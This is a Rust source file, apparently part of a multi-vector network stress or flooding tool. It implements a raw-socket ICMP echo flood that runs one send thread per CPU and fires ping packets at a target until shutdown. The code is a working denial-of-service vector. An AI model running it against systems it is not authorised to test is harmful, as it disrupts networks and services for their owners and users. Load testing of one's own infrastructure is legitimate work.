//! ICMP echo flood worker (L3, raw socket, requires root/CAP_NET_RAW).
//!
//! Emits ICMP echo requests (pings) to the target from this host's real source
//! address. Like the TCP raw vectors, one **leader** (worker `idx 0`) owns the
//! send path and every other logical worker no-ops: the leader spawns a small
//! pool of plain OS threads (one per CPU), each with its own raw channel. That
//! keeps a big `concurrency` off tokio's bounded blocking-thread pool — a worker
//! per blocking thread would pin the whole pool (default ~512), starving other
//! `spawn_blocking` users (the other raw leaders, the stop-on-detect prompt) and
//! silently dropping any workers past the cap.

use super::net::Target;
use super::raw::XorShift;
use super::{Governor, Metrics, Shutdown};
use pnet_packet::icmp::echo_request::MutableEchoRequestPacket;
use pnet_packet::icmp::{checksum, IcmpPacket, IcmpTypes};
use pnet_packet::ip::IpNextHeaderProtocols;
use pnet_transport::TransportChannelType::Layer4;
use pnet_transport::TransportProtocol::Ipv4;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::atomic::Ordering::Relaxed;
use std::sync::Arc;
use std::time::Duration;
use tracing::{info, warn};

const PAYLOAD_LEN: usize = 56; // classic ping payload size
const PKT_LEN: usize = 8 + PAYLOAD_LEN;

pub async fn worker(
    idx: u32,
    target: Arc<Target>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
) {
    // Only the leader touches the blocking pool; siblings return before ever
    // reaching `spawn_blocking`, so a 500-worker ICMP vector uses one blocking
    // thread (which fans out to OS threads) rather than 500.
    if idx != 0 {
        return;
    }
    let _ = tokio::task::spawn_blocking(move || run_leader(target, metrics, gov, shutdown)).await;
}

/// The leader: resolve the destination once, then run one send thread per CPU
/// (each its own raw channel + PRNG seed) and block until all finish on shutdown.
fn run_leader(target: Arc<Target>, metrics: Arc<Metrics>, gov: Arc<Governor>, shutdown: Arc<Shutdown>) {
    let IpAddr::V4(dst_ip) = target.addr.ip() else {
        warn!("icmp_flood: target is not IPv4 — skipping");
        return;
    };
    let nthreads = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1);
    info!(vector = "icmp_flood", threads = nthreads, "raw ICMP send pool armed");

    let mut handles = Vec::with_capacity(nthreads);
    for shard in 0..nthreads {
        let (m, g, s) = (metrics.clone(), gov.clone(), shutdown.clone());
        handles.push(std::thread::spawn(move || icmp_send_loop(shard as u32, dst_ip, &m, &g, &s)));
    }
    for h in handles {
        let _ = h.join();
    }
}

/// One send thread's loop: fresh echo requests until shutdown. `gov_idx` gates on
/// this vector's governor so the ramp still enables threads one at a time.
fn icmp_send_loop(gov_idx: u32, dst_ip: Ipv4Addr, metrics: &Metrics, gov: &Governor, shutdown: &Shutdown) {
    let proto = Layer4(Ipv4(IpNextHeaderProtocols::Icmp));
    let (mut tx, _rx) = match pnet_transport::transport_channel(4096, proto) {
        Ok(ch) => ch,
        Err(e) => {
            warn!(error = %e, "icmp_flood: cannot open raw socket (need root) — skipping");
            return;
        }
    };

    let mut rng = XorShift::seeded(gov_idx);
    let mut buf = [0u8; PKT_LEN];

    loop {
        if shutdown.is_down() {
            return;
        }
        if !gov.active(gov_idx) {
            std::thread::sleep(Duration::from_millis(100));
            continue;
        }

        let r = rng.next();
        {
            let mut pkt =
                MutableEchoRequestPacket::new(&mut buf).expect("buffer fits an echo request");
            pkt.set_icmp_type(IcmpTypes::EchoRequest);
            pkt.set_identifier(r as u16);
            pkt.set_sequence_number((r >> 16) as u16);
            pkt.set_checksum(0);
        }
        let cksum = checksum(&IcmpPacket::new(&buf).expect("icmp view"));
        let mut pkt = MutableEchoRequestPacket::new(&mut buf).expect("buffer fits an echo request");
        pkt.set_checksum(cksum);

        metrics.requests_sent.fetch_add(1, Relaxed);
        match tx.send_to(pkt, IpAddr::V4(dst_ip)) {
            Ok(n) => {
                metrics.bytes_sent.fetch_add(n as u64, Relaxed);
                // Local raw send accepted — NOT an echo reply. See Metrics::packets_sent.
                metrics.packets_sent.fetch_add(1, Relaxed);
            }
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
            }
        }
    }
}
